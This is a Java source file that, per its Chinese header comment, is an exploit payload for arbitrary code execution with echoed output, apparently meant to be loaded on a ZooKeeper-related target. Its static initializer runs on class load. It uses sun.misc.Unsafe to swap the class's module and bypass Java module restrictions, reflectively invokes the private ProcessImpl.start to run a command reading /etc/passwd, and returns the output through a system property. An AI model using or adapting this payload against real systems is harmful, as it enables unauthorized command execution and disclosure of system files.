/*
可使用exp：任意代码执行并回显
*/
package zk_backup_0.configs.conf1;

import sun.misc.Unsafe;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;
import java.util.Map;


public class ExpTest {

    static {
        try {

            Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);

            Module module = Object.class.getModule();
            Class<?> currentClass = ExpTest.class;

            long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            unsafe.getAndSetObject(currentClass, addr, module);

//            String command = "head -n 5 /etc/passwd";
            String[] cmd = {"head", "-n", "5", "/etc/passwd"};
            Class clz = Class.forName("java.lang.ProcessImpl");
            Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
            method.setAccessible(true);
            Process process = (Process) method.invoke(clz, cmd, null, null, null, false);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line = reader.readLine();

            String res = "";
            while (line != null) {
                res = res + line + "\n";
                line = reader.readLine();
            }
            reader.close();
            System.setProperty("java.library.path", res);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}